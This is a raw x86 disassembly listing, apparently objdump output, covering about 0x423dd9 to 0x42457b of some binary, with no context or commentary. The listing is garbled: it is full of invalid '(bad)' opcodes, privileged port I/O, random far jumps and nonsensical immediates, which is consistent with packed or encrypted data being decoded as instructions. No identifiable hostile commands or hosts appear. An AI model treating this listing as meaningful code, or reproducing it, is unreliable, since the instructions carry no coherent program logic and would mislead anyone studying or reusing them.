  423dd9:	push   ecx
  423dda:	loopne 0x423d83
  423ddc:	popa   
  423ddd:	inc    eax
  423dde:	pop    esi
  423ddf:	push   0xffffff9e
  423de1:	pusha  
  423de2:	ins    BYTE PTR es:[edi],dx
  423de3:	out    0x43,al
  423de5:	adc    al,0x89
  423de7:	cmp    al,0xbb
  423de9:	mov    dh,bl
  423deb:	cld    
  423dec:	lods   eax,DWORD PTR ds:[esi]
  423ded:	out    0xf1,al
  423def:	ins    BYTE PTR es:[edi],dx
  423df0:	mov    ch,0x62
  423df2:	mov    esp,0x294a97b2
  423df7:	jp     0x423e0f
  423df9:	cmp    BYTE PTR [ebp-0x77],cl
  423dfc:	popf   
  423dfd:	repz ret 
  423dff:	jmp    0x2e34:0x65116b7a
  423e06:	sbb    eax,0x4ffc23b6
  423e0b:	mov    ch,0xcb
  423e0d:	cmp    ah,BYTE PTR [eax-0x66]
  423e10:	stc    
  423e11:	and    bl,BYTE PTR [ebx+edi*1-0x15]
  423e15:	push   ecx
  423e16:	(bad)
  423e19:	dec    ebp
  423e1a:	ret    
  423e1b:	mov    cl,0x5b
  423e1d:	inc    esp
  423e1e:	leave  
  423e1f:	loop   0x423e94
  423e21:	sbb    eax,0x728fdeea
  423e26:	in     al,dx
  423e27:	mov    bl,0x11
  423e29:	test   al,0x51
  423e2b:	adc    eax,0xb7d8340
  423e30:	inc    esi
  423e31:	js     0x423e8a
  423e33:	cmp    edi,eax
  423e35:	push   edx
  423e36:	retf   0xe927
  423e39:	sbb    al,0x17
  423e3b:	pop    edx
  423e3c:	scas   al,BYTE PTR es:[edi]
  423e3d:	adc    dl,BYTE PTR [ebx-0x1b]
  423e40:	(bad)
  423e44:	pop    esp
  423e45:	cdq    
  423e46:	or     edi,esi
  423e48:	xchg   BYTE PTR [edx+0x54],al
  423e4b:	fbstp  TBYTE PTR ds:0xb938f726
  423e51:	mov    esp,0x3941b1c0
  423e56:	rcr    BYTE PTR [ebx],0xd7
  423e59:	mov    DWORD PTR [esi+0x7e],ebx
  423e5c:	push   0xffffff94
  423e5e:	and    BYTE PTR ds:0x4c8e8dd0,al
  423e64:	retf   0x5533
  423e67:	mov    al,0x62
  423e69:	je     0x423df3
  423e6b:	scas   eax,DWORD PTR es:[edi]
  423e6c:	cwde   
  423e6d:	sub    BYTE PTR [esi-0x2],ah
  423e70:	clc    
  423e71:	inc    ecx
  423e72:	sub    al,0xeb
  423e74:	mov    eax,ds:0x47f88890
  423e79:	add    BYTE PTR [eax+ebx*4-0x49cd2e59],al
  423e80:	push   ebx
  423e81:	add    BYTE PTR [edi],ch
  423e83:	xchg   BYTE PTR [edx+0x6a],dh
  423e86:	cmp    al,0x4
  423e88:	push   0x4
  423e8a:	lahf   
  423e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e8c:	xor    edi,DWORD PTR [edx-0x6d148e93]
  423e92:	xor    eax,0x16da6940
  423e97:	sub    bh,bl
  423e99:	mov    edi,0xda138f28
  423e9e:	jecxz  0x423f1e
  423ea0:	mov    edx,0xe5c0fa6f
  423ea5:	hlt    
  423ea6:	jge    0x423f00
  423ea8:	bound  ecx,QWORD PTR [esi-0x3c]
  423eab:	cld    
  423eac:	(bad)  [ebx]
  423eae:	pop    edi
  423eaf:	pop    esi
  423eb0:	ins    BYTE PTR es:[edi],dx
  423eb1:	mov    dl,0x49
  423eb3:	call   0x2091:0x6f3e6ad4
  423eba:	inc    esi
  423ebb:	stos   DWORD PTR es:[edi],eax
  423ebc:	lods   al,BYTE PTR ds:[esi]
  423ebd:	add    al,al
  423ebf:	mov    ah,0xd
  423ec1:	mov    dl,0xfa
  423ec3:	or     ebp,DWORD PTR [eax+0x7d]
  423ec6:	cs push edx
  423ec8:	jbe    0x423f3e
  423eca:	add    BYTE PTR [edi-0x49],0xfa
  423ece:	mov    BYTE PTR [edi],0xd4
  423ed1:	(bad)  
  423ed2:	aas    
  423ed3:	ds inc eax
  423ed5:	retf   
  423ed6:	ret    0x6c8c
  423ed9:	jmp    0x5484fd2a
  423ede:	push   es
  423edf:	sahf   
  423ee0:	into   
  423ee1:	xchg   esi,eax
  423ee2:	push   ebp
  423ee3:	pop    edx
  423ee4:	cmp    DWORD PTR [esi+0x4c],eax
  423ee7:	mov    ch,0x33
  423ee9:	rol    DWORD PTR [ebx],1
  423eeb:	(bad)  
  423eec:	fisttp WORD PTR [ebp+0x6]
  423eef:	jb     0x423e96
  423ef1:	dec    esi
  423ef2:	sub    BYTE PTR [eax],bh
  423ef4:	cmp    al,0xe8
  423ef6:	aas    
  423ef7:	addr16 fwait
  423ef9:	push   cs
  423efa:	in     al,0x4b
  423efc:	cmp    al,0xfc
  423efe:	xor    al,0x3a
  423f00:	fdivr  DWORD PTR [edi+0x7d647d26]
  423f06:	inc    ebp
  423f07:	pop    eax
  423f08:	(bad)  
  423f09:	push   0x74ccbe50
  423f0e:	and    al,0xf
  423f10:	adc    BYTE PTR [ebx+0x60d9b5b0],bl
  423f16:	stos   DWORD PTR es:[edi],eax
  423f17:	int3   
  423f18:	or     eax,0xb9e43088
  423f1d:	sbb    dl,BYTE PTR [ebx]
  423f1f:	scas   al,BYTE PTR es:[edi]
  423f20:	adc    BYTE PTR [eax],dh
  423f22:	icebp  
  423f23:	push   edx
  423f24:	push   eax
  423f25:	jns    0x423f4c
  423f27:	cmc    
  423f28:	dec    ebp
  423f29:	pop    ebp
  423f2a:	jno    0x423f54
  423f2c:	inc    edx
  423f2d:	fbld   TBYTE PTR ds:[edi+0x4a]
  423f31:	sahf   
  423f32:	xchg   ebx,eax
  423f33:	fst    st(5)
  423f35:	add    al,0x27
  423f37:	cmove  esp,DWORD PTR [ebx-0xbb9405d]
  423f3e:	mov    ecx,0x2fbc65f0
  423f43:	fs iret 
  423f45:	push   ebp
  423f46:	jo     0x423efb
  423f48:	and    eax,0xfa23c531
  423f4d:	(bad)  
  423f4e:	ss sahf 
  423f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f51:	idiv   DWORD PTR [edx+0x64]
  423f54:	adc    bl,ch
  423f56:	mov    ebp,0xdd0f917d
  423f5b:	cwde   
  423f5c:	test   al,0xfc
  423f5e:	xchg   ebx,eax
  423f5f:	test   BYTE PTR [ebx-0x34],al
  423f62:	dec    eax
  423f63:	pop    edi
  423f64:	sbb    edi,DWORD PTR [edi-0x167b842e]
  423f6a:	shl    DWORD PTR [esi],0xa6
  423f6d:	int    0x17
  423f6f:	stc    
  423f70:	pop    esp
  423f71:	dec    edi
  423f72:	inc    edx
  423f73:	mov    ch,BYTE PTR [ecx]
  423f75:	xor    al,0xb8
  423f77:	cmp    al,0xd5
  423f79:	mov    cs,edx
  423f7b:	pop    ebp
  423f7c:	aas    
  423f7d:	std    
  423f7e:	fdivr  QWORD PTR [ebx]
  423f80:	dec    edi
  423f81:	aaa    
  423f82:	jns    0x423fb6
  423f84:	cmp    al,0xb6
  423f86:	xor    eax,0xdc0b084f
  423f8b:	jg     0x423f6f
  423f8d:	xchg   ebp,eax
  423f8e:	icebp  
  423f8f:	xlat   BYTE PTR ds:[ebx]
  423f90:	xor    bl,dl
  423f92:	mov    ch,0x68
  423f94:	and    BYTE PTR [ebx],bl
  423f96:	or     eax,0x3e2dec45
  423f9b:	dec    esp
  423f9c:	ret    0xa84e
  423f9f:	pushf  
  423fa0:	icebp  
  423fa1:	pop    edx
  423fa2:	mov    esp,0x78e0020b
  423fa7:	mov    ebx,0xcc972447
  423fac:	nop
  423fad:	icebp  
  423fae:	add    bh,dl
  423fb0:	jmp    0x3898bf4c
  423fb5:	xor    al,0xdc
  423fb7:	pop    edi
  423fb8:	jns    0x423fd6
  423fba:	call   0x762873f2
  423fbf:	jmp    FWORD PTR [ebp+0x794ba23a]
  423fc5:	in     eax,0xe8
  423fc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fc8:	(bad)  
  423fc9:	xor    dh,BYTE PTR [esi+0xc]
  423fcc:	(bad)  
  423fcd:	push   eax
  423fce:	xor    ah,cl
  423fd0:	mov    ecx,0x6fd59205
  423fd5:	dec    edi
  423fd6:	add    eax,0x7ca885cb
  423fdb:	nop
  423fdc:	shr    DWORD PTR [edi+ecx*2+0x5c8f387b],cl
  423fe3:	ins    DWORD PTR es:[edi],dx
  423fe4:	imul   edx,DWORD PTR [eax-0x6c9c9f3a],0x3c821f4d
  423fee:	int3   
  423fef:	push   0xffffff80
  423ff1:	int3   
  423ff2:	retf   
  423ff3:	aaa    
  423ff4:	mov    dh,0xc8
  423ff6:	icebp  
  423ff7:	call   0x5ff19b8d
  423ffc:	jne    0x424031
  423ffe:	add    DWORD PTR [edi+edi*1],esi
  424001:	bnd jb 0x42405b
  424004:	jl     0x423f91
  424006:	mov    cl,0xee
  424008:	jg     0x42402d
  42400a:	mov    ecx,0x80bf4789
  42400f:	retf   0xeb19
  424012:	imul   esp,esi,0x68
  424015:	sbb    DWORD PTR [edx+ebp*2+0x79],0xffffff93
  42401a:	ficomp WORD PTR [edi]
  42401c:	sbb    esi,DWORD PTR [esi]
  42401e:	stos   DWORD PTR es:[edi],eax
  42401f:	imul   ecx,DWORD PTR [edx+0x1a],0x9d7268b2
  424026:	(bad)  
  424027:	js     0x424022
  424029:	stos   DWORD PTR es:[edi],eax
  42402a:	pop    edi
  42402b:	das    
  42402c:	mov    WORD PTR [ebp+0x3318fc84],?
  424032:	mov    dh,0x4e
  424034:	clc    
  424035:	mov    eax,0x12203b16
  42403a:	xlat   BYTE PTR ds:[ebx]
  42403b:	rcr    ebp,cl
  42403d:	cli    
  42403e:	lods   al,BYTE PTR ds:[esi]
  42403f:	in     al,0x1c
  424041:	(bad)  
  424042:	mov    al,ds:0xa1650f04
  424047:	jecxz  0x4240a3
  424049:	pop    esi
  42404a:	ret    
  42404b:	or     eax,ebx
  42404d:	add    eax,DWORD PTR [esi-0x5]
  424050:	mov    ebp,0x87e010e6
  424055:	jl     0x423fee
  424057:	int    0x7c
  424059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42405a:	outs   dx,BYTE PTR ds:[esi]
  42405b:	popa   
  42405c:	cld    
  42405d:	loopne 0x4240dd
  42405f:	(bad)  
  424060:	in     al,dx
  424061:	push   edx
  424062:	sbb    esp,DWORD PTR [ebx]
  424064:	loop   0x424031
  424066:	int    0xe7
  424068:	ror    DWORD PTR [ecx+0xb],1
  42406b:	mov    ecx,0x76721446
  424070:	sbb    DWORD PTR [ecx],edx
  424072:	arpl   ax,di
  424074:	jmp    0x89b0:0x1985046e
  42407b:	xchg   ebx,eax
  42407c:	cmp    al,0x13
  42407e:	push   0x5bfe6852
  424083:	mov    eax,ds:0x146b1852
  424088:	push   edi
  424089:	aas    
  42408a:	(bad)  
  42408b:	sti    
  42408c:	mov    ecx,0xa7dddca6
  424091:	rol    BYTE PTR [eax+0x7b],0xa4
  424095:	cmp    eax,DWORD PTR [eax]
  424097:	outs   dx,BYTE PTR ds:[esi]
  424098:	mov    al,0x8
  42409a:	xor    esi,DWORD PTR [esi-0x1a707f34]
  4240a0:	and    cl,BYTE PTR [eax+0x5c274d4c]
  4240a6:	repz cmp eax,0x792044c5
  4240ac:	cld    
  4240ad:	mov    ah,0xb1
  4240af:	mov    esp,0xb4718592
  4240b4:	shl    DWORD PTR [esi+ebx*2+0x5c],cl
  4240b8:	je     0x4240d9
  4240ba:	cmp    BYTE PTR [ebp-0x4c694d98],dh
  4240c0:	push   edi
  4240c1:	pop    esi
  4240c2:	aam    0x23
  4240c4:	sub    DWORD PTR [esi+0x70b4e2bd],esi
  4240ca:	adc    eax,ebp
  4240cc:	jb     0x42412f
  4240ce:	cmc    
  4240cf:	jle    0x424117
  4240d1:	push   ss
  4240d2:	or     BYTE PTR [esi+0x22],0xeb
  4240d6:	cmp    al,0x71
  4240d8:	jne    0x42408d
  4240da:	jbe    0x424141
  4240dc:	ins    DWORD PTR es:[edi],dx
  4240dd:	jmp    0x424086
  4240df:	mov    esi,0xae5c7617
  4240e4:	(bad)  
  4240e5:	add    al,0xe6
  4240e7:	into   
  4240e8:	in     eax,dx
  4240e9:	mov    esi,0xa7b61e63
  4240ee:	fs xchg ebp,eax
  4240f0:	sbb    eax,0x6228947
  4240f5:	mov    al,ds:0xc0d97d5b
  4240fa:	clc    
  4240fb:	or     al,0x13
  4240fd:	rcl    DWORD PTR [edi-0x27563fa7],0xa0
  424104:	mov    ds:0xa005b4db,eax
  424109:	inc    edx
  42410a:	fadd   st,st(6)
  42410c:	shr    DWORD PTR [esi-0x2144df50],1
  424112:	les    eax,FWORD PTR [ecx+ebx*4+0x36b078d6]
  424119:	ss dec ecx
  42411b:	out    dx,al
  42411c:	cwde   
  42411d:	call   0xc1b8:0x8f81a3df
  424124:	sub    esp,DWORD PTR [ebp+0x15]
  424127:	push   eax
  424128:	(bad)  
  424129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42412a:	fs pop edi
  42412c:	bound  ecx,QWORD PTR [edi-0x3a92ed1b]
  424132:	repnz pop esi
  424134:	dec    eax
  424135:	cmc    
  424136:	xor    ebx,DWORD PTR [esi-0x3e]
  424139:	push   esp
  42413a:	jno    0x4240f8
  42413c:	or     eax,0x7500cedc
  424141:	fsubr  st(2),st
  424143:	adc    DWORD PTR [edx],0x28ae8926
  424149:	inc    ebp
  42414a:	lock mov ds:0x1eb1b0ad,al
  424150:	(bad)  
  424151:	ror    BYTE PTR [ebx-0x5e],1
  424154:	aad    0xe3
  424156:	fs push esp
  424158:	jo     0x424172
  42415a:	push   cs
  42415b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42415c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42415d:	add    al,0xfc
  42415f:	mov    al,ds:0xf5878037
  424165:	arpl   bp,di
  424167:	les    ecx,FWORD PTR [ebx+0x21]
  42416a:	sahf   
  42416b:	cmp    eax,DWORD PTR [ebp+0x11]
  42416e:	mov    al,0xa9
  424170:	rcr    edx,0xe2
  424173:	(bad)  
  424174:	js     0x4241c5
  424176:	xor    esp,esi
  424178:	loop   0x42419f
  42417a:	retf   0xf260
  42417d:	outs   dx,DWORD PTR ds:[esi]
  42417e:	sti    
  42417f:	nop
  424180:	jnp    0x424115
  424182:	push   cs
  424183:	and    edx,edx
  424185:	cwde   
  424186:	stos   DWORD PTR es:[di],eax
  424188:	xchg   esp,eax
  424189:	xchg   BYTE PTR [edx],cl
  42418b:	ss mov ch,0xef
  42418e:	imul   eax,DWORD PTR [edi],0x70e6d0f1
  424194:	cmp    eax,0x2f9e9008
  424199:	and    ah,bl
  42419b:	cmp    al,0xff
  42419d:	sar    DWORD PTR [edi],0x57
  4241a0:	inc    esi
  4241a1:	das    
  4241a2:	shl    DWORD PTR [ebx],0x89
  4241a5:	in     al,dx
  4241a6:	jmp    0x561189d4
  4241ab:	add    DWORD PTR [ecx+0xc4a4ce3],eax
  4241b1:	ret    0xd481
  4241b4:	test   eax,0xb124e9f1
  4241b9:	pop    edx
  4241ba:	cmp    BYTE PTR [eax+0x47],dl
  4241bd:	fnstcw WORD PTR [ecx-0x7ba86fd7]
  4241c3:	push   esp
  4241c4:	sbb    eax,0x2289028
  4241c9:	lds    ecx,FWORD PTR [ecx-0x43f93dc5]
  4241cf:	lods   eax,DWORD PTR ds:[esi]
  4241d0:	or     al,0xf0
  4241d2:	(bad)  
  4241d3:	into   
  4241d4:	sahf   
  4241d5:	into   
  4241d6:	mov    cs,WORD PTR [esi+0x55]
  4241d9:	fist   DWORD PTR [ebp+ecx*2+0x5ae0ebfa]
  4241e0:	mov    al,0x13
  4241e2:	dec    eax
  4241e3:	sbb    eax,0x4721d6a3
  4241e8:	in     al,0x67
  4241ea:	adc    BYTE PTR gs:[ebx],dh
  4241ed:	adc    BYTE PTR [esi+0x10],ah
  4241f0:	imul   eax,DWORD PTR [ebp+0x14],0xffffffea
  4241f4:	sub    al,0x74
  4241f6:	and    BYTE PTR [edx+0x5bfe4dc1],dh
  4241fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241fd:	je     0x42419f
  4241ff:	and    BYTE PTR [esi],bh
  424201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424202:	dec    edx
  424203:	enter  0xdd66,0xdf
  424207:	rcr    eax,1
  424209:	mov    al,0xc1
  42420b:	xchg   ebx,eax
  42420c:	call   DWORD PTR [eax+ebp*8]
  42420f:	shr    BYTE PTR [ebx+0x4b9c1169],0x3f
  424216:	outs   dx,BYTE PTR ds:[esi]
  424217:	push   ss
  424218:	cdq    
  424219:	sub    BYTE PTR [ebp+0x235ea680],bh
  42421f:	std    
  424220:	jmp    0xe2860b40
  424225:	out    dx,eax
  424226:	push   DWORD PTR [esi]
  424228:	loopne 0x42420e
  42422a:	shr    cl,cl
  42422c:	push   edx
  42422d:	leave  
  42422e:	ins    BYTE PTR es:[edi],dx
  42422f:	aaa    
  424230:	inc    esp
  424231:	jnp    0x4241bb
  424233:	ja     0x4242a2
  424235:	loopne 0x42420b
  424237:	outs   dx,BYTE PTR ds:[esi]
  424238:	test   DWORD PTR [ebp+0x49],edx
  42423b:	out    dx,eax
  42423c:	shl    BYTE PTR [edi+0x11a69395],1
  424242:	mul    BYTE PTR [ecx-0x60fd72f1]
  424248:	hlt    
  424249:	pop    ebp
  42424a:	out    dx,eax
  42424b:	xor    al,0x32
  42424d:	pop    ds
  42424e:	add    edx,ecx
  424250:	push   ds
  424251:	jae    0x42429b
  424253:	push   0xffffffb9
  424255:	push   esp
  424256:	sbb    eax,0x2e58181c
  42425b:	xchg   ebx,eax
  42425c:	loope  0x4242a3
  42425e:	cwde   
  42425f:	shr    edi,1
  424261:	stos   BYTE PTR es:[edi],al
  424262:	cli    
  424263:	mov    bl,BYTE PTR [ecx-0x76ab27db]
  424269:	bound  eax,QWORD PTR [edi]
  42426b:	mov    edi,ecx
  42426d:	or     ebx,DWORD PTR [edi]
  42426f:	fsub   QWORD PTR [ecx+0x3a401d9f]
  424275:	arpl   WORD PTR [edx+0x2],sp
  424278:	mov    dl,0x66
  42427a:	xor    eax,0xbd71a170
  42427f:	xor    bl,dh
  424281:	or     eax,0x8ed867d4
  424286:	mov    dl,bh
  424288:	sub    BYTE PTR [esi-0xdf3fc19],ch
  42428e:	out    dx,eax
  42428f:	xchg   DWORD PTR [edi-0x5],edi
  424292:	mov    DWORD PTR es:[ecx-0xa90cc90],edi
  424299:	loope  0x424284
  42429b:	dec    ebx
  42429c:	nop
  42429d:	sub    eax,0xf762fc28
  4242a2:	inc    eax
  4242a3:	mov    ds:0x4149cd3b,eax
  4242a8:	pop    ss
  4242a9:	sbb    DWORD PTR [esi+0x3e376dcb],ebx
  4242af:	fstp   st(6)
  4242b1:	stos   DWORD PTR es:[edi],eax
  4242b2:	mov    cl,0x30
  4242b4:	and    BYTE PTR [ebx],ch
  4242b6:	out    0xbd,al
  4242b8:	jmp    0x80faae22
  4242bd:	xchg   ch,ah
  4242bf:	pop    esi
  4242c0:	rcr    BYTE PTR [eax],cl
  4242c2:	sbb    DWORD PTR [esi-0x142e014c],0x34
  4242c9:	pop    eax
  4242ca:	sti    
  4242cb:	push   0x2
  4242cd:	dec    ecx
  4242ce:	ja     0x4242d2
  4242d0:	repz popf 
  4242d2:	imul   edi,DWORD PTR [edx-0x45086b11],0xffffff95
  4242d9:	push   ebx
  4242da:	popf   
  4242db:	pop    ebx
  4242dc:	add    DWORD PTR [edx+ebx*1-0x6e],0xffffffe0
  4242e1:	jo     0x424286
  4242e3:	outs   dx,DWORD PTR ds:[esi]
  4242e4:	or     ebp,eax
  4242e6:	cli    
  4242e7:	dec    esp
  4242e8:	jmp    0x8b842801
  4242ed:	stc    
  4242ee:	ret    
  4242ef:	stc    
  4242f0:	dec    esp
  4242f1:	dec    DWORD PTR [edi]
  4242f3:	jno    0x424337
  4242f5:	add    al,0xf1
  4242f7:	jmp    0x424376
  4242f9:	pop    DWORD PTR [esi-0x78]
  4242fc:	fwait
  4242fd:	add    edx,DWORD PTR [edx+0x2a4c48e8]
  424303:	movaps xmm6,xmm0
  424306:	cld    
  424307:	js     0x4242e6
  424309:	pop    edi
  42430a:	call   0x94decc17
  42430f:	fld    QWORD PTR [esi]
  424311:	pushf  
  424312:	test   BYTE PTR [esi+0x4f],cl
  424315:	mov    ebx,0xe2eee939
  42431a:	mov    bl,0xb2
  42431c:	add    ebx,DWORD PTR [ebp-0x5a]
  42431f:	arpl   WORD PTR [esi+ecx*2-0x18],ax
  424323:	lods   al,BYTE PTR ds:[esi]
  424324:	jmp    0x4242e9
  424326:	icebp  
  424327:	fisub  WORD PTR [ebx-0x1f2e5f8c]
  42432d:	ins    DWORD PTR es:[edi],dx
  42432e:	push   ebp
  42432f:	xor    BYTE PTR [edi+ebx*8+0x40],dh
  424333:	and    eax,0xfd691b3e
  424338:	xlat   BYTE PTR ds:[ebx]
  424339:	leave  
  42433a:	aam    0x42
  42433c:	push   ss
  42433d:	mov    bh,0x62
  42433f:	sub    eax,DWORD PTR [edx]
  424341:	fdivr  QWORD PTR [ebx-0x2efd3bc3]
  424347:	(bad)  
  424348:	test   DWORD PTR [eax],0x4862c80d
  42434e:	mov    ch,0x6b
  424350:	inc    ebp
  424351:	out    0x84,al
  424353:	sbb    bh,dh
  424355:	fist   DWORD PTR [ebx]
  424357:	mov    ds:0xa49dccc7,eax
  42435c:	cmp    al,0xcb
  42435e:	pushf  
  42435f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424360:	mov    ah,0x4b
  424362:	shl    DWORD PTR [esi+0xedbcb02],0xe4
  424369:	int    0x40
  42436b:	scas   eax,DWORD PTR es:[edi]
  42436c:	mov    ebx,0xce56ae6f
  424371:	sbb    ecx,esi
  424373:	inc    esi
  424374:	adc    eax,0xb3cf2a2e
  424379:	retf   
  42437a:	sbb    al,0x88
  42437c:	or     dh,BYTE PTR [ecx]
  42437e:	ja     0x424398
  424380:	push   edx
  424381:	mov    ecx,0x6919d977
  424386:	sbb    DWORD PTR [edi],edx
  424388:	enter  0x8b52,0xd0
  42438c:	lods   eax,DWORD PTR fs:[esi]
  42438e:	addr16 pop ss
  424390:	in     eax,0x44
  424392:	cmp    al,dh
  424394:	std    
  424395:	cwde   
  424396:	adc    BYTE PTR [ecx],dh
  424398:	push   es
  424399:	lods   al,BYTE PTR ds:[esi]
  42439a:	jl     0x42433b
  42439c:	dec    ebp
  42439d:	(bad)  
  42439e:	xlat   BYTE PTR ds:[ebx]
  42439f:	xchg   esp,eax
  4243a0:	es daa 
  4243a2:	ret    0x8011
  4243a5:	and    al,BYTE PTR [ebp-0x391ff23b]
  4243ab:	xor    dh,bh
  4243ad:	jp     0x42436c
  4243af:	enter  0x2ea3,0xa0
  4243b3:	push   ds
  4243b4:	xor    DWORD PTR [eax-0x41],0x4b
  4243b8:	imul   edx
  4243ba:	(bad)  [ecx+eax*2]
  4243bd:	int3   
  4243be:	pop    esi
  4243bf:	xchg   esp,eax
  4243c0:	fild   WORD PTR [edi]
  4243c2:	aad    0x35
  4243c4:	and    dl,BYTE PTR [ecx]
  4243c6:	jns    0x424410
  4243c8:	add    BYTE PTR [eax],al
  4243ca:	pop    edx
  4243cb:	inc    esp
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x4243e1
  4243d7:	xchg   edi,eax
  4243d8:	lods   al,BYTE PTR ds:[esi]
  4243d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243da:	push   ds
  4243db:	rol    BYTE PTR [ecx],cl
  4243dd:	add    BYTE PTR [esi-0x6bfffffa],al
  4243e3:	mov    esi,0x4133e3bb
  4243e8:	lods   eax,DWORD PTR ds:[esi]
  4243e9:	sbb    al,0xe5
  4243eb:	shl    BYTE PTR [edi+eiz*1+0xd],0x12
  4243f0:	xor    BYTE PTR [edi],0x9b
  4243f3:	mov    ch,0x92
  4243f5:	push   edx
  4243f6:	inc    ecx
  4243f7:	push   ebx
  4243f8:	pop    edi
  4243f9:	hlt    
  4243fa:	mov    ebx,0x82b2a59f
  4243ff:	lea    edx,[edi+0x3e]
  424402:	leave  
  424403:	add    esp,ebx
  424405:	hlt    
  424406:	(bad)  
  424407:	aad    0x57
  424409:	stos   BYTE PTR es:[edi],al
  42440a:	retf   
  42440b:	in     eax,0xfb
  42440d:	pop    edx
  42440e:	jae    0x4243ec
  424410:	call   0xab37:0xd0dd1712
  424417:	call   0x815cda4f
  42441c:	mov    bl,0xce
  42441e:	sbb    BYTE PTR [ebx+0x591485b8],al
  424424:	aas    
  424425:	lock sahf 
  424427:	mov    WORD PTR [esi-0x5e410fa5],?
  42442d:	jo     0x42440b
  42442f:	(bad)  
  424430:	call   0x30118ce9
  424435:	push   ebx
  424436:	pop    eax
  424437:	mov    ebx,eax
  424439:	xor    al,ah
  42443b:	sbb    al,0x3d
  42443d:	ja     0x4243c8
  42443f:	mov    dh,0x90
  424441:	call   0xcc87:0xa8a5f7f2
  424448:	or     eax,0x599497e3
  42444d:	out    dx,eax
  42444e:	(bad)
  424452:	stc    
  424453:	bound  ebp,QWORD PTR [esi-0x38]
  424456:	sbb    esi,DWORD PTR [ebx]
  424458:	mov    ebp,0x5c33bcca
  42445d:	sub    bh,dh
  42445f:	or     DWORD PTR [eax],esi
  424461:	mov    al,ds:0x6d0539ae
  424466:	mov    DWORD PTR ds:0x2e6496f4,0xc1d80483
  424470:	ret    0xf0d4
  424473:	lock cmc 
  424475:	mov    edx,0x4bb19b57
  42447a:	xchg   esp,eax
  42447b:	cdq    
  42447c:	addr16 pusha 
  42447e:	jmp    0xc3addb65
  424483:	not    BYTE PTR [eax]
  424485:	call   0x2cbd1854
  42448a:	in     eax,0xd5
  42448c:	lea    ebx,[ebx]
  42448e:	push   cs
  42448f:	or     esp,DWORD PTR [esi+0x2]
  424492:	xchg   ebx,eax
  424493:	in     al,dx
  424494:	mov    ah,0x9
  424496:	dec    edx
  424497:	xchg   edi,eax
  424498:	in     eax,dx
  424499:	in     eax,dx
  42449a:	pop    ds
  42449b:	rol    BYTE PTR [ebp-0x2a5603c4],0x86
  4244a2:	(bad)  
  4244a4:	push   0x3a
  4244a6:	add    eax,DWORD PTR [eax-0x38f0e916]
  4244ac:	jg     0x4244df
  4244ae:	push   ebx
  4244af:	dec    edi
  4244b0:	pushf  
  4244b1:	cmc    
  4244b2:	push   edi
  4244b3:	fld    DWORD PTR [eax+0x78]
  4244b6:	mov    ah,0xed
  4244b8:	inc    esi
  4244b9:	in     eax,dx
  4244ba:	mov    bl,0x6b
  4244bc:	shl    BYTE PTR [ebp-0x4b],0x5b
  4244c0:	sbb    BYTE PTR [esi],dl
  4244c2:	cwde   
  4244c3:	cmp    ch,BYTE PTR [edx]
  4244c5:	(bad)  
  4244c6:	das    
  4244c7:	pop    ebp
  4244c8:	mov    dh,0xae
  4244ca:	outs   dx,BYTE PTR ds:[esi]
  4244cb:	fistp  DWORD PTR [edx-0x2c721d2c]
  4244d1:	daa    
  4244d2:	stc    
  4244d3:	mov    edx,0xe75c4797
  4244d8:	pop    esp
  4244d9:	xchg   ebx,eax
  4244da:	push   ecx
  4244db:	std    
  4244dc:	aaa    
  4244dd:	cld    
  4244de:	lods   eax,DWORD PTR ds:[esi]
  4244df:	cmc    
  4244e0:	mov    dh,0x25
  4244e2:	inc    edi
  4244e3:	push   ss
  4244e4:	in     al,dx
  4244e5:	(bad)  
  4244e6:	and    bl,BYTE PTR [edx]
  4244e8:	mov    ds:0xfd77289a,al
  4244ed:	jno    0x42451a
  4244ef:	jns    0x424516
  4244f1:	clc    
  4244f2:	loop   0x4244e2
  4244f4:	and    esi,DWORD PTR [eax-0xc19d8f3]
  4244fa:	fisub  WORD PTR [edi]
  4244fc:	ret    
  4244fd:	hlt    
  4244fe:	or     ecx,edx
  424500:	xor    BYTE PTR [eax+0x39b04f8c],0x44
  424507:	rcl    ebp,1
  424509:	mov    ecx,0x7495d96f
  42450e:	jne    0x4244d9
  424510:	ss ret 
  424512:	mul    BYTE PTR [edi+0xfed7797]
  424518:	out    dx,eax
  424519:	mov    esi,0xdec9da6
  42451e:	stos   BYTE PTR es:[edi],al
  42451f:	push   0x5d27a246
  424524:	add    al,0x80
  424526:	shl    BYTE PTR [ecx+0x29],cl
  424529:	pop    esp
  42452a:	inc    edx
  42452b:	cld    
  42452c:	pop    esp
  42452d:	cmp    eax,0x78834118
  424532:	cmp    al,0x76
  424534:	inc    edi
  424535:	dec    esi
  424536:	mov    ch,0x68
  424538:	and    BYTE PTR [esi+ecx*8],0xb
  42453c:	push   cs
  42453d:	ret    
  42453e:	stos   DWORD PTR es:[edi],eax
  42453f:	cwde   
  424540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424541:	or     DWORD PTR [ebx+0x2f],0xffffff8c
  424545:	lea    ebx,[edx]
  424547:	pushf  
  424548:	sub    DWORD PTR [esi+0x5e],ecx
  42454b:	push   esp
  42454c:	sub    al,0x65
  42454e:	pop    ebx
  42454f:	pusha  
  424550:	mov    edi,0x8a752376
  424555:	fsub   DWORD PTR ds:0x1c25a3c6
  42455b:	rcr    DWORD PTR [di+0x31],0xf0
  424560:	jnp    0x4244f7
  424562:	iret   
  424563:	ins    DWORD PTR es:[edi],dx
  424564:	cmp    eax,0xfd9ca36d
  424569:	pushf  
  42456a:	(bad)  
  42456c:	jecxz  0x4245ed
  42456e:	call   0xda85:0x703efdd4
  424575:	not    DWORD PTR ds:0xa7a828be
  42457b:	pop    es
